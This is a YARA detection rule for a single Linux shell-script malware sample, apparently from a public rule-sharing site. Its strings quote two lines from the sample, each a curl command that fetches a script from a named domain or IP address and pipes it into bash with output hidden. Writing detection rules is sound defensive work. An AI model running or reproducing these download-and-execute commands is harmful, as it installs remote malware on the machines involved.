rule LIN_Sample_Unique_2bcc91fd {
    meta:
        description = "Specimen unique (soumission Bazaar) - strings distinctifs propres au sample"
        author      = "Marjoriefort"
        date        = "2026-09-17"
        reference   = "2bcc91fdedb8c583a9fe883be9ad453333a1bba0fdf655474982db3cbb8e7a74.sh"
        confidence  = "low"
        note        = "Regle specimen : vise la re-soumission identique. Verifier en sandbox."
        yarahub_uuid              = "65a3a0af-e046-4c06-9d37-e7543cc03151"
        yarahub_license           = "CC0 1.0"
        yarahub_reference_md5     = "1fff24c4c0b2fa465eb3a9b63e689abd"
        yarahub_reference_link    = "https://github.com/Marjoriefort/yara-rules"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
    strings:
        $a = "    curl -s --connect-timeout 15 digital.digitaldatainsights.org/.x/black3 | bash >/dev/null 2>&1" ascii wide
        $b = "    curl -s 195.24.237.240/.x/black3 | bash >/dev/null 2>&1" ascii wide
    condition:
        all of them
}
